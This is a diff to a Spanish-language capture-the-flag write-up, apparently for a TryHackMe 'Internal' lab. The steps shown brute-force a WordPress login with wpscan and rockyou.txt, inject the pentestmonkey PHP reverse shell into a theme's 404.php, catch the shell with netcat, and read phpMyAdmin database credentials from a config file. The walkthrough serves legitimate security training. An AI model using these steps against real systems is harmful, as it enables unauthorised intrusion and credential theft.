@@ -69,11 +69,11 @@
 5. **Fuerza bruta en Wordpress**
 
         - wpscan --url http://internal.thm/blog/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50
- ````
- [!] Valid Combinations Found:
- | Username: admin, Password: *******
-Correo: admin@internal.thm
- ````
+        ````
+        [!] Valid Combinations Found:
+        | Username: admin, Password: *******
+        Correo: admin@internal.thm
+        ````
 6. **Creamos una reverse shell en Wordpress**
 
         -  Vamos a los temas
@@ -81,4 +81,24 @@ Correo: admin@internal.thm
         - Inyectamos en 404.php la reverse shell --> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
         - Nos conectamos: http://10.10.17.84/wordpress/wp-content/themes/twentyseventeen/404.php
         - Estamos a la escucha: nc -lvp 4444
+7. **Usuario phpmyadmin**
 
+        - Encontramos un usuario pero no podemo acceder a su directorio. Seguimos buscando:
+        - En /etc/phmyadmin encontramos unas credenciales:
+                -- cat config-db.php
+         ````
+         <?php
+        ##
+        ## database access settings in php format
+        ## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
+        ## by /usr/sbin/dbconfig-generate-include
+        ##
+        ## by default this file is managed via ucf, so you shouldn't have to
+        ## worry about manual changes being silently discarded.  *however*,
+        ## you'll probably also want to edit the configuration file mentioned
+        ## above too.
+        ##
+        $dbuser='phpmyadmin';
+        $dbpass='B2Ud4fEOZmVq';
+        ````
+      
